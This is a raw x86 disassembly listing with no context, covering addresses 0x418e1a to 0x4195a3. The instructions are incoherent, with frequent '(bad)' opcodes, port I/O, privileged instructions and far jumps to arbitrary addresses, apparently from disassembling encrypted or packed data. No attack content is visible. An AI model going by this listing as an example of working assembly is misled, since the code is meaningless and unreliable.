  418e1a:	popf   
  418e1b:	mov    ds:0x62321d55,al
  418e20:	inc    esi
  418e21:	pop    edi
  418e22:	dec    edi
  418e23:	scas   al,BYTE PTR es:[edi]
  418e24:	inc    ebx
  418e25:	adc    DWORD PTR [esp+eax*4-0x55],0x4a476740
  418e2d:	xor    cl,dl
  418e2f:	leave  
  418e30:	retf   
  418e31:	std    
  418e32:	or     ah,BYTE PTR [ebp+0x1a]
  418e35:	cmp    DWORD PTR [edx+ebp*2],eax
  418e38:	sub    eax,0x7cd397bb
  418e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e3e:	jo     0x418ea7
  418e40:	ffree  st(7)
  418e42:	ja     0x418e37
  418e44:	dec    esp
  418e45:	push   ds
  418e46:	push   es
  418e47:	stos   BYTE PTR es:[edi],al
  418e48:	icebp  
  418e49:	inc    esp
  418e4a:	jmp    0x74606f9e
  418e4f:	stos   BYTE PTR es:[edi],al
  418e50:	stos   DWORD PTR es:[edi],eax
  418e51:	ss pop ecx
  418e53:	push   esp
  418e54:	(bad)  [eax-0x4f]
  418e57:	or     al,0xb0
  418e59:	nop
  418e5a:	fnstcw WORD PTR [esi-0x6e03a298]
  418e60:	push   0x18568c20
  418e65:	xchg   esi,eax
  418e66:	push   ebp
  418e67:	outs   dx,DWORD PTR ds:[esi]
  418e68:	out    dx,al
  418e69:	add    BYTE PTR [esi],0x5e
  418e6c:	cli    
  418e6d:	add    BYTE PTR [ebx+0x4d1b5323],al
  418e73:	outs   dx,DWORD PTR ds:[esi]
  418e74:	dec    edx
  418e75:	fsqrt  
  418e77:	out    dx,eax
  418e78:	or     al,0x81
  418e7a:	(bad)
  418e7e:	mov    dh,0x6d
  418e80:	data16 repnz adc ah,BYTE PTR [ebx+0x3de066e]
  418e88:	adc    al,0xc4
  418e8a:	or     eax,0xe11e25b3
  418e8f:	lea    eax,[ebx-0x30b2af11]
  418e95:	and    DWORD PTR [eax-0xce21ffc],0x2c
  418e9c:	cmp    eax,0xe22912b2
  418ea1:	xchg   edx,eax
  418ea2:	xchg   ecx,edx
  418ea4:	les    ebp,FWORD PTR [edi]
  418ea6:	adc    DWORD PTR [esi+0x76e01727],eax
  418eac:	inc    ecx
  418ead:	scas   eax,DWORD PTR es:[edi]
  418eae:	pop    es
  418eaf:	sub    dh,BYTE PTR [ebp-0x4badf38d]
  418eb5:	jbe    0x418f13
  418eb7:	fstp   TBYTE PTR [edi]
  418eb9:	out    dx,al
  418eba:	(bad)  
  418ebb:	inc    ebx
  418ebc:	xlat   BYTE PTR ds:[ebx]
  418ebd:	push   0x8c26f224
  418ec2:	int3   
  418ec3:	test   DWORD PTR [ecx],edx
  418ec5:	cmp    dl,ah
  418ec7:	push   eax
  418ec8:	jnp    0x418ef6
  418eca:	rcl    DWORD PTR [esi+0x5e339469],cl
  418ed0:	mov    dl,0xd8
  418ed2:	push   cs
  418ed3:	cmp    al,0x39
  418ed5:	repnz xor edx,DWORD PTR [eax*4+0x4f41f6d0]
  418edd:	jmp    0x2f1e8ef9
  418ee2:	lds    eax,FWORD PTR [ebp-0x3f]
  418ee5:	cmp    edx,ebx
  418ee7:	cmc    
  418ee8:	mov    al,0xae
  418eea:	push   ecx
  418eeb:	(bad)  
  418eec:	pop    ecx
  418eed:	adc    DWORD PTR [ebx+0x62],edi
  418ef0:	ja     0x418e84
  418ef2:	ins    DWORD PTR es:[edi],dx
  418ef3:	adc    BYTE PTR ds:0xafc6c7a7,0x64
  418efa:	inc    eax
  418efb:	hlt    
  418efc:	dec    eax
  418efd:	jno    0x418ec3
  418eff:	rcr    dl,0x6b
  418f02:	jnp    0x418f26
  418f04:	aas    
  418f05:	fdiv   DWORD PTR [ebx+0x5f5ccff0]
  418f0b:	inc    ebx
  418f0c:	or     al,0x9d
  418f0e:	pop    eax
  418f0f:	push   esp
  418f10:	jmp    0xaf29710e
  418f15:	adc    esi,esi
  418f17:	dec    ebp
  418f18:	jmp    0x418eea
  418f1a:	sbb    eax,0x22b327e1
  418f1f:	sbb    DWORD PTR [eax+0x73],0xffffffe7
  418f23:	lods   al,BYTE PTR ds:[esi]
  418f24:	jmp    0x418f3d
  418f26:	dec    ecx
  418f27:	xchg   ecx,eax
  418f28:	jecxz  0x418edb
  418f2a:	out    0x44,al
  418f2c:	pushf  
  418f2d:	sbb    al,0x3e
  418f2f:	sbb    ecx,eax
  418f31:	lods   al,BYTE PTR ds:[esi]
  418f32:	sub    edx,DWORD PTR [eax]
  418f34:	inc    ebp
  418f35:	ja     0x418fb4
  418f37:	aaa    
  418f38:	jle    0x418f08
  418f3a:	arpl   WORD PTR [edx-0x488d80ec],si
  418f40:	aaa    
  418f41:	xchg   BYTE PTR [edx-0x44],ch
  418f44:	outs   dx,BYTE PTR ds:[esi]
  418f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f46:	cmp    BYTE PTR [ecx],cl
  418f48:	call   0xa456aea1
  418f4d:	ins    BYTE PTR es:[edi],dx
  418f4e:	jae    0x418fc4
  418f50:	xor    eax,0x56ac6fd9
  418f55:	lods   eax,DWORD PTR ds:[esi]
  418f56:	hlt    
  418f57:	out    dx,al
  418f58:	push   es
  418f59:	cmp    eax,0xe5ca510b
  418f5e:	mov    edx,DWORD PTR [ebx]
  418f60:	out    dx,al
  418f61:	cmp    al,0x75
  418f63:	push   cs
  418f64:	push   0x10
  418f66:	push   edx
  418f67:	ret    
  418f68:	ficom  DWORD PTR [edi*2+0x12378ca3]
  418f6f:	les    ebp,FWORD PTR [edx]
  418f71:	jo     0x418f1e
  418f73:	js     0x418f8a
  418f75:	mov    eax,ds:0x3acdcb37
  418f7a:	out    dx,al
  418f7b:	in     eax,dx
  418f7c:	loope  0x418f00
  418f7e:	icebp  
  418f7f:	pop    edi
  418f80:	int3   
  418f81:	fmul   st,st(5)
  418f83:	dec    ebp
  418f84:	data16 xchg BYTE PTR [edi+ecx*2],ch
  418f88:	ins    DWORD PTR es:[edi],dx
  418f89:	sbb    edx,DWORD PTR [ecx+0x57]
  418f8c:	dec    edx
  418f8d:	pop    edi
  418f8e:	adc    al,0xc0
  418f90:	pop    ebp
  418f91:	add    dl,dl
  418f93:	adc    edi,DWORD PTR [edi]
  418f95:	clc    
  418f96:	push   ds
  418f97:	jl     0x418fd6
  418f99:	push   ecx
  418f9a:	test   BYTE PTR [edi-0x4d],cl
  418f9d:	add    DWORD PTR [eax],0x8
  418fa0:	adc    eax,0xbeadd28c
  418fa5:	mov    esi,0x7bbeb0aa
  418faa:	daa    
  418fab:	lds    eax,FWORD PTR [edx+ebp*4+0x6]
  418faf:	jne    0x419021
  418fb1:	out    0x89,eax
  418fb3:	sbb    BYTE PTR [eax+0x6a6a98d8],dh
  418fb9:	xchg   ebx,eax
  418fba:	rol    BYTE PTR [eax-0x273c52e0],cl
  418fc0:	gs adc al,0xda
  418fc3:	jo     0x418fff
  418fc5:	inc    edi
  418fc6:	mov    bh,0x66
  418fc8:	xor    eax,0x6372ae87
  418fcd:	sahf   
  418fce:	jnp    0x41901d
  418fd0:	jne    0x418fd2
  418fd2:	xchg   esp,eax
  418fd3:	and    BYTE PTR [edx],ch
  418fd5:	arpl   WORD PTR [esp+edx*4+0x2c],di
  418fd9:	cmp    ebx,edx
  418fdb:	or     ebx,DWORD PTR [esi]
  418fdd:	mov    esi,DWORD PTR [ecx+eax*2]
  418fe0:	and    DWORD PTR [esi],0x1
  418fe3:	in     al,dx
  418fe4:	xchg   esp,eax
  418fe5:	cwde   
  418fe6:	aas    
  418fe7:	repnz into 
  418fe9:	sar    BYTE PTR [ecx],cl
  418feb:	(bad)  
  418fec:	dec    ebp
  418fed:	jbe    0x41905c
  418fef:	xor    edx,ebp
  418ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ff2:	mov    ebx,0x2d97999
  418ff7:	mov    al,ds:0x81e7bcff
  418ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ffd:	enter  0xa1f9,0x54
  419001:	add    BYTE PTR [ebx-0x653bda29],cl
  419007:	stc    
  419008:	dec    esi
  419009:	fdivr  QWORD PTR [esi+esi*1]
  41900c:	jno    0x41901c
  41900e:	jbe    0x41900d
  419010:	cmp    al,0x7c
  419012:	or     BYTE PTR [eax+eiz*8],ch
  419015:	into   
  419016:	inc    ebp
  419017:	mov    bl,0xc8
  419019:	pop    es
  41901a:	pop    edi
  41901b:	inc    ebx
  41901c:	out    0x29,eax
  41901e:	rol    DWORD PTR [ebp-0x5c],cl
  419021:	pop    ss
  419022:	xchg   edi,eax
  419023:	rol    DWORD PTR [bx+di-0x11f],cl
  419028:	or     edx,DWORD PTR ds:0xf18271b9
  41902e:	dec    ebx
  41902f:	test   eax,0x7a6cf5b7
  419034:	js     0x419025
  419036:	push   cs
  419037:	jle    0x63103943
  41903d:	dec    ecx
  41903e:	inc    esp
  41903f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419040:	(bad)  
  419041:	dec    ebx
  419042:	mov    fs,WORD PTR [eax]
  419044:	xor    edi,ebx
  419046:	push   esi
  419047:	mov    ebp,0xac633568
  41904c:	push   es
  41904d:	sub    eax,0xfb9f9098
  419052:	test   al,0xf3
  419055:	lea    edi,[edx-0x61d19200]
  41905b:	pop    ds
  41905c:	jae    0x419018
  41905e:	cmc    
  41905f:	jmp    0xd634:0xc0bb718b
  419066:	aad    0x99
  419068:	push   0x1e388495
  41906d:	fstp   DWORD PTR [ebp+0x4a]
  419070:	(bad)
  419073:	and    ch,cl
  419075:	pop    ebx
  419076:	shl    DWORD PTR ds:0x75613060,cl
  41907c:	mov    ebp,?
  41907e:	push   esp
  41907f:	xchg   ch,ah
  419081:	jb     0x41904d
  419083:	nop
  419084:	inc    eax
  419085:	call   0x838c:0x539a640f
  41908c:	stc    
  41908d:	adc    al,0x23
  41908f:	cmp    al,0xe2
  419091:	int3   
  419092:	(bad)  
  419093:	jmp    0x4841f8cb
  419098:	test   al,0x9
  41909a:	push   es
  41909b:	iret   
  41909c:	pusha  
  41909d:	es int 0x60
  4190a0:	imul   ebp,DWORD PTR [edx+0x4],0x1196b4be
  4190a7:	fsub   DWORD PTR [esi-0x65]
  4190aa:	imul   ebx,DWORD PTR [ebx],0xcc83de17
  4190b0:	call   0x38581964
  4190b5:	addr16 mov edi,0xc3a011e7
  4190bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190bc:	cdq    
  4190bd:	outs   dx,DWORD PTR ds:[esi]
  4190be:	and    DWORD PTR [ebx+0x4b],0x426b04cb
  4190c5:	add    al,BYTE PTR [ecx]
  4190c7:	sub    dl,BYTE PTR [edi-0x49]
  4190ca:	xchg   al,bh
  4190cc:	inc    esp
  4190cd:	stos   BYTE PTR es:[edi],al
  4190ce:	pop    ecx
  4190cf:	dec    BYTE PTR [edx-0x1e97b374]
  4190d5:	mov    ds:0x988fbbe4,eax
  4190da:	repnz nop
  4190dc:	scas   al,BYTE PTR es:[edi]
  4190dd:	inc    esp
  4190de:	into   
  4190df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e0:	pop    edx
  4190e1:	jnp    0x41914a
  4190e3:	stos   BYTE PTR es:[edi],al
  4190e4:	mov    dl,0x36
  4190e6:	pop    edi
  4190e7:	stc    
  4190e8:	and    BYTE PTR [edi],ch
  4190ea:	retf   
  4190eb:	lods   al,BYTE PTR ds:[esi]
  4190ec:	push   ebx
  4190ed:	popf   
  4190ee:	es out dx,al
  4190f0:	das    
  4190f1:	sbb    eax,0x4d13bd7
  4190f6:	loopne 0x41913b
  4190f8:	pop    ebp
  4190f9:	add    DWORD PTR ds:0xf3cf6cbd,ebp
  4190ff:	ja     0x4190ce
  419101:	popa   
  419102:	push   edx
  419103:	addr16 mov esi,0x693bc1bf
  419109:	cmp    DWORD PTR [esi],ebp
  41910b:	xor    BYTE PTR [ebp+0x12],al
  41910e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41910f:	pusha  
  419110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419112:	leave  
  419113:	sbb    al,0xf
  419115:	(bad)  
  419116:	hlt    
  419117:	lods   al,BYTE PTR ds:[esi]
  419118:	xchg   ecx,eax
  419119:	push   cs
  41911a:	mov    edi,0x2d8be050
  41911f:	inc    ebx
  419120:	pusha  
  419121:	lods   ax,WORD PTR ds:[esi]
  419123:	pop    ebx
  419124:	and    al,0x7a
  419126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419127:	inc    edi
  419128:	pop    esi
  419129:	push   ds
  41912a:	pop    ss
  41912b:	mov    DWORD PTR [edx],edi
  41912d:	and    dh,bh
  41912f:	adc    DWORD PTR [ecx],eax
  419131:	iret   
  419132:	dec    ebx
  419133:	inc    ecx
  419134:	cli    
  419135:	pop    es
  419136:	sub    cl,dl
  419138:	jmp    0x49fc4cf8
  41913d:	in     eax,dx
  41913e:	retf   
  41913f:	jbe    0x419195
  419141:	or     al,0xd9
  419143:	pop    ds
  419144:	push   esp
  419145:	xchg   esi,eax
  419146:	shr    ebp,cl
  419148:	out    dx,al
  419149:	stos   BYTE PTR es:[edi],al
  41914a:	bound  ecx,QWORD PTR [ebx-0x45de70c1]
  419150:	push   0x478074fb
  419155:	loope  0x419160
  419157:	xor    eax,edi
  419159:	leave  
  41915a:	pop    edx
  41915b:	retf   0x6f4b
  41915e:	outs   dx,DWORD PTR ds:[esi]
  41915f:	bnd jo 0x4191a8
  419162:	sub    eax,0x8ed2f00e
  419167:	pop    ebp
  419168:	call   0x3ae:0xfcad9b99
  41916f:	xor    esi,DWORD PTR [ebp+edx*1-0x11]
  419173:	adc    BYTE PTR [edx-0x4597fcca],0xc8
  41917a:	in     eax,0xe9
  41917c:	pop    esp
  41917d:	cmp    bh,BYTE PTR [ebx+0x71]
  419180:	mov    bl,0xb5
  419182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419183:	outs   dx,BYTE PTR ds:[esi]
  419184:	jmp    0x55d35ade
  419189:	and    BYTE PTR [ecx],0x3c
  41918c:	retf   
  41918d:	leave  
  41918e:	pop    edi
  41918f:	xor    DWORD PTR ds:0xb3b39b4a,edi
  419195:	leave  
  419196:	fdiv   QWORD PTR [ebp+0x51fdb057]
  41919c:	sub    BYTE PTR [eax+0x70],bh
  41919f:	popf   
  4191a0:	mov    dl,0x7e
  4191a2:	rcl    DWORD PTR [edx+0x4c97d52f],cl
  4191a8:	adc    BYTE PTR [esi],ah
  4191aa:	xchg   esp,eax
  4191ab:	not    ebx
  4191ad:	pusha  
  4191ae:	leave  
  4191af:	xchg   ebx,eax
  4191b0:	out    dx,eax
  4191b1:	sahf   
  4191b2:	inc    eax
  4191b3:	dec    DWORD PTR [eax-0x14]
  4191b6:	outs   dx,BYTE PTR ds:[esi]
  4191b7:	push   ss
  4191b8:	int3   
  4191b9:	dec    ebp
  4191ba:	loope  0x419177
  4191bc:	int    0x46
  4191be:	leave  
  4191bf:	lahf   
  4191c0:	mov    esi,0x1a779dce
  4191c5:	mov    DWORD PTR [ecx-0x4e9b48be],esp
  4191cb:	ret    
  4191cc:	call   0xe24e5f2b
  4191d1:	enter  0x39dd,0x1d
  4191d5:	mov    fs,WORD PTR [edx-0x4a]
  4191d8:	cmp    BYTE PTR [edi+esi*4],dh
  4191db:	mulps  xmm0,XMMWORD PTR [eax]
  4191de:	add    edi,ecx
  4191e0:	mov    edx,0x42caaef3
  4191e5:	test   BYTE PTR ds:0xb0468039,0x46
  4191ec:	mov    al,ds:0x8444fbda
  4191f1:	push   ebp
  4191f2:	adc    ebx,ecx
  4191f4:	push   0xffffff89
  4191f6:	fisttp DWORD PTR [ebx]
  4191f8:	call   0x2900:0xe9bee9c8
  4191ff:	jnp    0x4191ac
  419201:	xor    al,0x9
  419203:	ja     0x419267
  419205:	lock jnp 0x419283
  419208:	ret    0xb277
  41920b:	call   0x6539:0x8790db82
  419212:	into   
  419213:	jmp    0x41919a
  419215:	adc    ch,BYTE PTR [ecx-0x15]
  419218:	in     al,0xd3
  41921a:	addr16 ret 
  41921c:	iret   
  41921d:	nop
  41921e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41921f:	js     0x419293
  419221:	cs addr16 mov cl,0xcd
  419225:	lea    edx,[eax-0x2b]
  419228:	xchg   ebx,eax
  419229:	push   ebp
  41922a:	lods   eax,DWORD PTR ds:[esi]
  41922b:	sar    DWORD PTR [ecx],1
  41922d:	jle    0x4191ec
  41922f:	fist   WORD PTR [esi-0x68]
  419232:	ss je  0x41922b
  419235:	or     dl,BYTE PTR [edx+0x15]
  419238:	ret    0x588a
  41923b:	loope  0x419260
  41923d:	enter  0xfb63,0x6d
  419241:	dec    edx
  419242:	enter  0xb632,0x57
  419246:	shr    BYTE PTR [esi-0x6a60e867],0x36
  41924d:	out    dx,al
  41924e:	icebp  
  41924f:	xchg   edx,eax
  419250:	inc    ebp
  419251:	imul   esi,DWORD PTR [eax+ebp*2],0x4b
  419255:	mov    ebx,0xdb44f57b
  41925a:	(bad)  
  41925b:	fldl2t 
  41925d:	stc    
  41925e:	lahf   
  41925f:	jne    0x4192bd
  419261:	jl     0x4192ac
  419263:	cli    
  419264:	jnp    0x4192dc
  419266:	clc    
  419267:	push   ebp
  419268:	adc    BYTE PTR [ecx+0x9],al
  41926b:	and    BYTE PTR [ecx+0x61],dl
  41926e:	pop    esi
  41926f:	fldcw  WORD PTR [ecx-0x50]
  419272:	lock xchg esp,eax
  419274:	inc    esp
  419275:	nop
  419276:	(bad)  
  419277:	daa    
  419278:	jp     0x419242
  41927a:	fild   WORD PTR [edi-0x555a8620]
  419280:	es ret 0x848f
  419284:	add    al,0x5a
  419286:	ja     0x419301
  419288:	or     dh,al
  41928a:	xchg   edx,eax
  41928b:	sub    DWORD PTR [ebp+edi*8-0x8185f28],esi
  419292:	pop    eax
  419293:	popf   
  419294:	test   cl,0x3c
  419297:	sbb    dh,BYTE PTR [eax+0x171cbd69]
  41929d:	adc    BYTE PTR [edi+eiz*4-0x54],al
  4192a1:	jne    0x419231
  4192a3:	dec    ebx
  4192a4:	adc    ebp,esi
  4192a6:	frstor [ebp-0x2cddf379]
  4192ac:	pusha  
  4192ad:	aaa    
  4192ae:	jl     0x41923e
  4192b0:	int3   
  4192b1:	fldln2 
  4192b3:	and    eax,ecx
  4192b5:	daa    
  4192b6:	iret   
  4192b7:	aad    0x3d
  4192b9:	inc    ecx
  4192ba:	test   BYTE PTR [ecx-0x69],dh
  4192bd:	pop    edx
  4192be:	sub    al,0x59
  4192c0:	data16 and al,BYTE PTR [esi-0x14]
  4192c4:	add    esi,DWORD PTR [ecx]
  4192c6:	add    ebp,DWORD PTR [eax]
  4192c8:	jb     0x41929c
  4192ca:	sti    
  4192cb:	fwait
  4192cc:	jecxz  0x41928e
  4192ce:	sub    eax,0x9cb06ee8
  4192d3:	mov    esp,0xf142aa8
  4192d8:	shl    DWORD PTR [edi-0x1346fcd1],0x6
  4192df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192e0:	mov    ebx,0x38bb2639
  4192e5:	sbb    eax,0x4cc83fa2
  4192ea:	push   edi
  4192eb:	stc    
  4192ec:	pop    DWORD PTR [ebp-0x1a]
  4192ef:	ficomp WORD PTR [esi-0x50]
  4192f2:	loope  0x419276
  4192f4:	into   
  4192f5:	inc    ebp
  4192f6:	mov    ds:0x83fc9ccc,al
  4192fb:	out    0x50,eax
  4192fd:	hlt    
  4192fe:	push   esp
  4192ff:	adc    bh,BYTE PTR [edi+0x49a19787]
  419305:	fist   WORD PTR [eax+0x7ab40491]
  41930b:	aas    
  41930c:	xchg   edi,eax
  41930d:	adc    eax,0x4bfd1b96
  419312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419313:	rcr    BYTE PTR [eax+0x65],0x9f
  419317:	add    eax,0xcf0c11b6
  41931c:	jb     0x419352
  41931e:	call   0xdee4:0x774df872
  419325:	popa   
  419326:	mov    dl,BYTE PTR [edi+0x4053780c]
  41932c:	cmc    
  41932d:	sbb    al,0xb8
  41932f:	cmp    eax,0xbfa80d5
  419334:	inc    edx
  419335:	add    DWORD PTR [ebx-0x5f02d5c3],0x21
  41933c:	inc    edi
  41933d:	xor    al,0x74
  41933f:	pop    es
  419340:	push   ebp
  419341:	push   esi
  419342:	ja     0x4193ba
  419344:	add    eax,0x5df1aee3
  419349:	dec    ebp
  41934a:	in     al,0xa4
  41934c:	and    ch,cl
  41934e:	ret    
  41934f:	lods   al,BYTE PTR ds:[esi]
  419350:	mov    al,ds:0x707ede08
  419355:	mov    ecx,0x6e806e02
  41935a:	lock dec edx
  41935c:	adc    al,0x26
  41935e:	in     eax,0x1f
  419360:	test   al,0xe6
  419362:	loop   0x4193ad
  419364:	adc    BYTE PTR [esi],dl
  419366:	je     0x419308
  419368:	xlat   BYTE PTR gs:[ebx]
  41936a:	or     edx,DWORD PTR [ebx+0xe]
  41936d:	cdq    
  41936e:	lods   eax,DWORD PTR ds:[esi]
  41936f:	pusha  
  419370:	push   ecx
  419371:	dec    edi
  419372:	xor    ch,BYTE PTR [eax-0x6a]
  419375:	pop    ds
  419376:	mov    dh,0xed
  419378:	sahf   
  419379:	jge    0x41932a
  41937b:	lahf   
  41937c:	mov    ebp,0x2e32a5cf
  419381:	pop    es
  419382:	push   ebx
  419383:	mov    ebx,0x3c979991
  419388:	push   es
  419389:	xor    DWORD PTR [ebp+0x1a],eax
  41938c:	mov    ch,0x0
  41938e:	adc    ebx,DWORD PTR [edi+0x35]
  419391:	mov    bh,0xc
  419393:	mov    eax,ds:0x82b7266e
  419398:	int3   
  419399:	fisttp DWORD PTR [ecx*4+0x41f51ffa]
  4193a0:	fstp   DWORD PTR [edi]
  4193a2:	aaa    
  4193a3:	lods   al,BYTE PTR ds:[esi]
  4193a4:	pusha  
  4193a5:	mov    ch,cl
  4193a7:	aam    0xe5
  4193a9:	fdivr  st(2),st
  4193ab:	ins    BYTE PTR es:[edi],dx
  4193ac:	add    DWORD PTR [esi],esi
  4193ae:	add    al,0x39
  4193b0:	xor    DWORD PTR [eax-0x32003e11],ebx
  4193b6:	in     al,dx
  4193b7:	in     eax,dx
  4193b8:	outs   dx,BYTE PTR ds:[esi]
  4193b9:	jp     0x4193da
  4193bb:	mov    al,ds:0xd500a0ab
  4193c0:	shl    DWORD PTR [ecx-0x47b6d6f7],1
  4193c6:	inc    eax
  4193c7:	inc    eax
  4193c8:	dec    ecx
  4193c9:	xor    al,0xba
  4193cb:	sub    al,0xd1
  4193cd:	hlt    
  4193ce:	xor    al,0x8f
  4193d0:	call   0x8846:0x52041000
  4193d7:	and    al,0x39
  4193d9:	test   eax,0xf88cc244
  4193de:	mov    al,0x51
  4193e0:	xor    eax,0x2fd6ca8c
  4193e5:	push   ss
  4193e6:	xchg   dl,bh
  4193e8:	xchg   DWORD PTR [eax+0x53],eax
  4193eb:	ds and eax,0x8e13c3d1
  4193f1:	aaa    
  4193f2:	push   ebp
  4193f3:	(bad)  
  4193f4:	cli    
  4193f5:	test   DWORD PTR [edi],edi
  4193f7:	mov    ebp,0xac7bf3f6
  4193fc:	(bad)  
  4193fd:	(bad)  
  4193ff:	cmp    ebp,esi
  419401:	xor    eax,0x83199b2a
  419406:	test   BYTE PTR [eax+edx*2-0x192265c1],ah
  41940d:	sub    al,0xda
  41940f:	mov    WORD PTR [ecx],?
  419411:	fwait
  419412:	int3   
  419413:	fcmovnbe st,st(5)
  419415:	jne    0x419421
  419417:	pop    ds
  419418:	dec    edx
  419419:	enter  0x5aed,0x15
  41941d:	dec    esp
  41941e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41941f:	or     esp,ebp
  419421:	add    eax,0xabfc4108
  419426:	push   ds
  419427:	jmp    0x41942e
  419429:	or     bl,BYTE PTR [ecx-0x63]
  41942c:	mov    edx,0x49de4872
  419431:	pop    ds
  419432:	test   DWORD PTR [ebx+0x8],esi
  419435:	dec    ecx
  419436:	cmp    esp,DWORD PTR [eax]
  419438:	mov    cl,BYTE PTR [eax-0x68]
  41943b:	lods   al,BYTE PTR ds:[esi]
  41943c:	shl    DWORD PTR [edx],0xb5
  41943f:	xor    ch,BYTE PTR [edi]
  419441:	mov    WORD PTR [ebp+edx*4+0x7],gs
  419445:	jmp    0x8c292af4
  41944a:	push   cs
  41944b:	mov    dh,0x74
  41944d:	jns    0x419465
  41944f:	and    cl,BYTE PTR [ebx-0x1c]
  419452:	jb     0x419410
  419454:	cwde   
  419455:	mov    ecx,0x7eac8da7
  41945a:	iret   
  41945b:	jecxz  0x419491
  41945d:	ds scas eax,DWORD PTR es:[edi]
  41945f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419460:	add    dh,al
  419462:	xlat   BYTE PTR ds:[ebx]
  419463:	sahf   
  419464:	loope  0x41942e
  419466:	clc    
  419467:	mov    edi,DWORD PTR [edx+0x5c78a3bf]
  41946d:	jg     0x41944b
  41946f:	mov    BYTE PTR [esi+0x50d7eda5],bh
  419475:	sbb    BYTE PTR [ecx+0x67b8fe30],bl
  41947b:	retf   0xf413
  41947e:	jnp    0x41940c
  419480:	and    edi,ecx
  419482:	jecxz  0x4194cb
  419484:	shl    dl,0x41
  419487:	jmp    0xe0700fc6
  41948c:	and    dl,BYTE PTR [esi-0x789f7afd]
  419492:	pop    ecx
  419493:	arpl   WORD PTR [ecx-0x34],di
  419496:	ins    DWORD PTR es:[edi],dx
  419497:	pusha  
  419498:	jle    0x4194d4
  41949a:	aaa    
  41949b:	xchg   esi,eax
  41949c:	gs scas al,BYTE PTR es:[edi]
  41949e:	addr16 cmc 
  4194a0:	sar    DWORD PTR [edi+0xe],cl
  4194a3:	ds dec edi
  4194a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194a6:	loopne 0x41950c
  4194a8:	xor    ah,dh
  4194aa:	lea    esi,[ebx-0x7d]
  4194ad:	dec    edx
  4194ae:	pusha  
  4194af:	arpl   WORD PTR [edx-0x17],sp
  4194b2:	jno    0x4194ea
  4194b4:	int3   
  4194b5:	pushw  es
  4194b7:	jo     0x419448
  4194b9:	setb   ah
  4194bc:	adc    al,0xb9
  4194be:	int3   
  4194bf:	div    DWORD PTR [eax]
  4194c1:	ss mov ebp,0x6421ca07
  4194c7:	popa   
  4194c8:	leave  
  4194c9:	sbb    BYTE PTR [edx-0x55],bl
  4194cc:	push   ecx
  4194cd:	adc    edi,DWORD PTR [edx+ebx*8-0x18de3fef]
  4194d4:	sub    al,0xb3
  4194d6:	push   es
  4194d7:	or     BYTE PTR [edi-0xb],bl
  4194da:	jcxz   0x4194d7
  4194dd:	jg     0x419534
  4194df:	mov    bh,0x44
  4194e1:	push   esp
  4194e2:	ror    BYTE PTR [edi-0x32],cl
  4194e5:	data16 daa 
  4194e7:	add    esp,ecx
  4194e9:	ins    BYTE PTR es:[edi],dx
  4194ea:	aam    0x7
  4194ec:	or     bh,0x94
  4194ef:	inc    edi
  4194f0:	mov    ebx,DWORD PTR [edx]
  4194f2:	or     al,0x57
  4194f4:	cmp    eax,0x66fb1d87
  4194f9:	(bad)  
  4194fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194fb:	xlat   BYTE PTR ds:[ebx]
  4194fc:	cli    
  4194fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194fe:	js     0x4194fd
  419500:	scas   eax,DWORD PTR es:[edi]
  419501:	ss add al,0xb1
  419504:	xor    cl,BYTE PTR [ecx+0x50a07029]
  41950a:	gs addr16 (bad) 
  41950d:	jp     0x4194b6
  41950f:	out    dx,eax
  419510:	mov    ebx,0xd777734a
  419515:	ins    DWORD PTR es:[edi],dx
  419516:	aad    0xc0
  419518:	push   cs
  419519:	inc    eax
  41951a:	sbb    BYTE PTR [edi-0x16],0x5
  41951e:	cmp    eax,0xc9b4987c
  419523:	jmp    ebp
  419525:	pop    es
  419526:	stos   DWORD PTR es:[edi],eax
  419527:	retf   
  419528:	xchg   edx,eax
  419529:	dec    esi
  41952a:	fyl2x  
  41952c:	and    DWORD PTR [ebp+0x28],edi
  41952f:	fstp   QWORD PTR [esi-0x2]
  419532:	xchg   edx,eax
  419533:	sub    DWORD PTR [eax+0x4d9b45ee],ecx
  419539:	sbb    DWORD PTR ds:[edx-0x219726d0],ecx
  419540:	jmp    0xd007:0xe907c02
  419547:	mov    ebx,0x940b4181
  41954c:	and    bl,BYTE PTR [ecx]
  41954e:	mov    ecx,0x9b813012
  419553:	add    DWORD PTR es:[eax],0xffffffa7
  419557:	cmp    eax,0x16c20562
  41955c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41955d:	adc    DWORD PTR [esi],edi
  41955f:	mov    cl,0xef
  419561:	dec    esi
  419562:	loop   0x41956b
  419564:	mov    dl,0x2f
  419566:	and    DWORD PTR [ebp-0x34219da6],eax
  41956c:	gs push edi
  41956e:	jle    0x4195c7
  419570:	das    
  419571:	mov    esp,0x1039bcf4
  419576:	aam    0xd4
  419578:	ret    0xe0c8
  41957b:	mov    ah,0xe0
  41957d:	jnp    0x4195a8
  41957f:	sub    BYTE PTR [ecx+0x26],0x47
  419583:	jg     0x4195c3
  419585:	fadd   QWORD PTR [edi+eiz*2+0x11]
  419589:	cwde   
  41958a:	not    ebp
  41958c:	imul   esp,DWORD PTR [edi-0x4e],0xac409708
  419593:	add    eax,0x3cfcfcf8
  419598:	popf   
  419599:	adc    cl,BYTE PTR [edx-0x5a]
  41959c:	mov    ah,0xb3
  41959e:	adc    eax,0xf655af1f
  4195a3:	retf   0x3116
